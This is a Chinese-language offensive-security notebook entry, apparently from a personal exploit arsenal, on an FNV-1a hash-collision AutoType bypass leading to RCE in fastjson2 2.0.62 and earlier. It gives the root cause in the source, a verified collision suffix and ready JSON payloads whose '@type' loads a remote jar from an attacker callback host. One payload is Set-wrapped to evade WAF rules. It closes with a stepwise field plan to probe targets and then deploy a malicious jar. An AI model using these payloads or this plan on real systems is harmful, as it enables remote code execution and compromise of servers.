# fastjson2 FNV-1a 哈希碰撞 AutoType 绕过 RCE 收录案例（2026-08）

## 漏洞要点
- 长亭应急响应实验室 2026-07-27 原创发现上报（公众号黑伞安全/腾讯云开发者社区同步）；NHPT/Fastjson2-RCE GitHub 仓库（2026-08）公开完整工具链（Go CPU / CUDA GPU 碰撞搜索器 + lab 复现环境 + 恶意 jar 构建）
- 影响: fastjson2 **<= 2.0.62**；修复: 官方 PR #7695（2.0.63）
- 条件: 默认配置（SafeMode OFF）可打、无需目标存在已知危险类、全 JDK 8~21、无需权限/无用户交互、攻击者仅需控制 JSON 请求体
- 利用成熟度: 通告时点标注"POC 未公开"；2026-08 仓库公开后为**公开 1day**（收录时点不到一个月，非老 nday）

## 根因（源码实锤, 2.0.62）
- `ObjectReaderProvider.checkAutoType()` 的 autoTypeSupport true/false **两分支代码逻辑完全相同**: 逐字符增量 FNV-1a 哈希（`MAGIC_HASH_CODE=0xcbf29ce484222325L`，`MAGIC_PRIME=0x100000001b3L`，`$`→`.`），每步 `Arrays.binarySearch(acceptHashCodes, hash)`，**命中即 `clazz = loadClass(typeName)`，从不验证前缀文本是否等于白名单类名**
- `loadClass` 是 `import static com.alibaba.fastjson2.util.TypeUtils.loadClass`（ObjectReaderProvider.java 头部 import 实锤）
- 默认 `acceptHashCodes` 只有一个哈希: `-6293031534589903644L`（无符号 `0xa8aaa929446ffce4`）
- 修复 PR #7695 两层: ① `ContextAutoTypeBeforeHandler.apply` 直接拒 typeName 含 `:` 或 `!`；② 新增 `acceptNameSet`，哈希命中后验证 `substring(0, i+1)` 前缀文本在白名单内，不在则 `continue`

## 碰撞构造（chosen-prefix collision）
- FNV-1a 可逆（MAGIC_PRIME 为奇数，模 2^64 存在乘法逆元）: `c = h_i XOR (h_{i+1} * P^-1)`
- 但 Java char 仅 16 位 → 单字符命中概率约 1/2^48；工程方案取 **4 字符后缀**（枚举前 3 个 char + 逆运算反推第 4 个），搜索空间 2^48；更多字符需重新设计搜索策略
- **后缀与 URL 前缀绑定**（增量哈希从头算起，前缀变了整条哈希序列就变）: 换回调服务器/路径必须重新搜碰撞——用户 payload 里的后缀只适用于原前缀
- 工具: NHPT poc/ 目录 Go `collision_search`（`-prefix/-workers/-start/-end` 按首后缀字符 c0 分片并行）与 CUDA GPU 版
- **已验证可复用后缀**: 前缀 `jar:http://127.0.0.1:19090/probe_echo.jar!/` + 后缀 `\u23df\u96f2\ud880\udfb7` 在第 47 字符命中（Python 复算确认，NHPT README 示例）

## 载荷形态与触发形态矩阵（2.0.62 + JDK8 本地端到端实测）
- 公开 PoC: `{"@type":"jar:http://EVIL/probe_echo.jar!/\u23df\u96f2\ud880\udfb7"}`（尾部 4 字符为碰撞后缀）
- 实战形态（用户 2026-08 提供）: `{"x":Set[{"@type":"jar:http://IP:9996/pocs/x.jar!/<后缀>"}]}` —— Set 包装: 集合元素反序列化同样走 checkAutoType，外层 key 是普通字段名而非 @type，可绕"只拦第一层 @type"的 WAF 规则
- `jar:http://host/x.jar!/entry` 是 Java jar URL 标准格式（`jar:<url>!/<entry>`）

触发矩阵（判定: 碰撞后缀 vs 非碰撞后缀解析耗时差）:
| 形态 | 触发 checkAutoType→loadClass |
|---|---|
| 顶层 `{"@type":"jar:...!/<碰撞>"}` parseObject(String) | ✅ ~298ms（vs 非碰撞 0ms）|
| DTO `Set<Object>` 字段 + `{"x":Set[{"@type":"..."}]}` | ✅ ~297ms（用户实战形态有效）|
| DTO Set<Object> + 数组语法 / List / Map / Object 字段嵌套 | ❌ 0~8ms |
| parseObject(String) 顶层裸 Set 嵌套 / JSON.parse | ❌ |

**触发判定技巧（无需改代码加日志）**: 碰撞 vs 非碰撞后缀的解析耗时差（~300ms vs 0ms）= loadClass 被调用的证据（三次类加载器 CNFE 的开销）。

## 前置条件（源码级判定 + 本地实测, 本案例最大价值）
- `TypeUtils.loadClass(className)` 实现: `length>=192 拒 → switch 常见类名映射 → TYPE_MAPPINGS → 数组类处理 → contextClassLoader.loadClass → JSON.class.getClassLoader().loadClass → Class.forName → return null`
- **全程无 `new URL()` / `getResourceAsStream` / `URLClassLoader`** → 标准环境对 `jar:http://...` 类型名只得到 ClassNotFoundException → 返回 null，**连一个网络请求都不会发**

三种环境实测（contextClassLoader.loadClass("jar:http://127.0.0.1:19090/probe_echo.jar!/<碰撞后缀>")）:
| 环境 | 结果 |
|---|---|
| 裸 main（AppClassLoader）| CNFE，2ms，无回连 |
| Spring Boot fat-jar（LaunchedURLClassLoader）| CNFE，24ms，无回连 |
| URLClassLoader 显式挂 jar:http URL classpath | CNFE，2ms，无回连 |

- 可打前提: 目标 JVM 的上下文类加载器被替换/实现为"识别 `jar:http://` → 远程下载 → defineClass"的自定义 ClassLoader。候选场景: 国产中间件（东方通 TongWeb 等魔改类加载器）、插件化/低代码平台（动态加载用户 jar）。NHPT 复现即自写 ClassLoader，README 原话"真实业务场景几乎不存在"
- **与 fastjson1 CVE-2026-16723 机制不同，勿混淆**: 1.x 走 `getResourceAsStream` 资源探测路径（fat-jar LaunchedURLClassLoader 前置），2.x 走 `loadClass` 标准类加载路径——fat-jar 前置不能搬用
- 长亭通告"全 JDK 通杀"指 **JDK 版本维度**（8/11/17/21 全验证），非环境维度——真正的变量是类加载器实现，通告未披露复现环境

## 实战打法（渐进, 零副作用）
```
1. 搭回调 HTTP 服务（托管桩 jar, 如 python http.server 返回空 zip 尾记录 PK\x05\x06）
2. 按回调前缀重搜碰撞后缀（前缀绑定, 硬约束）
3. 发 {"x":Set[{"@type":"jar:http://你:PORT/probe.jar!/<后缀>"}]} 探测
   → 收到请求 = 类加载器吃 jar: URL = 前置成立 → 再上完整恶意 jar
   → 收不到 = 环境不支持 → 换目标, 零损耗
```
- **探测即筛选器**: jar: URL 回连成功 = 可打性的决定性信号，比猜"哪个中间件有这种类加载器"高效，且完全只读。**收到回连前完整 RCE 别硬上**（浪费托管资源且大概率失败）

## 指纹
- 报错特征同 fastjson1: JSONException / autoType / ClassNotFoundException / com.alibaba.fastjson2
- 版本判定: 2.0.63+（含 PR #7695）直接拒绝含 `:`/`!` 的类型名

## 本地实测复现法（可复用）
1. 碰撞校验（Python 秒出）: `h = ((h ^ ord(ch)) * 0x100000001b3) % 2**64`; shell heredoc 里 `&` 位运算会被 terminal 拦截，用 `% 2**64` 写法。FNV 按 UTF-16 code unit（charAt）计算，代理对是两个独立 char，Python ord 逐 code unit 一致
2. 手动拼 Spring Boot fat-jar（Maven 不可用时）: ① 下 spring-boot-loader jar（2.7.18 兼容 JDK8，repo1 不稳换阿里云镜像 maven.aliyun.com/repository/public）; ② 解压 org/ 进 fat-jar 根 + BOOT-INF/classes + BOOT-INF/lib; ③ MANIFEST.MF: `Main-Class: org.springframework.boot.loader.JarLauncher` + `Start-Class: 业务类`; ④ `jar -0cfm` 打包 —— **嵌套 jar 必须 STORED 不压缩**，DEFLATED 报 "nested jar files must be stored without compression"
3. Windows 中文路径坑: javac 对中文路径 GBK 乱码报"找不到目录"，测试工程必须放纯 ASCII 路径（如 %TEMP%\fj2lab）; curl（Windows 原生）写 MSYS /tmp 的文件 python（Windows 原生）读不到，用 `cygpath -w /tmp` 或 os.environ['TEMP'] 对齐路径
4. Java 源码内联 unicode 转义（`\u23df` 等）在词法分析前替换为实际字符，直接写即可
5. 回调监听: python http.server 记 method/path/headers 到日志 + 返回桩 jar（空 zip 尾记录），判断是否发生下载请求

## 收录状态（2026-08-20）
- 用户提供实战 payload（脱敏 IP:9996/pocs 形态），判定公开 1day、收录价值高（fastjson2 国内存量巨大、默认配置、全 JDK）
- 前置条件实测已完成: 碰撞后缀有效 + 触发形态确认 + 标准环境零回连（结论: 触发易可利用难，回连探测是唯一判定）
- 计划产物: `武器库\fastjson2-FNV碰撞AutoType绕过RCE\`（0day.md + 探测 POC fj2_jar_probe.py + payload/jar_url.txt 占位 + 碰撞搜索器 NHPT 仓库归置, 恶意类本地自建不外传）
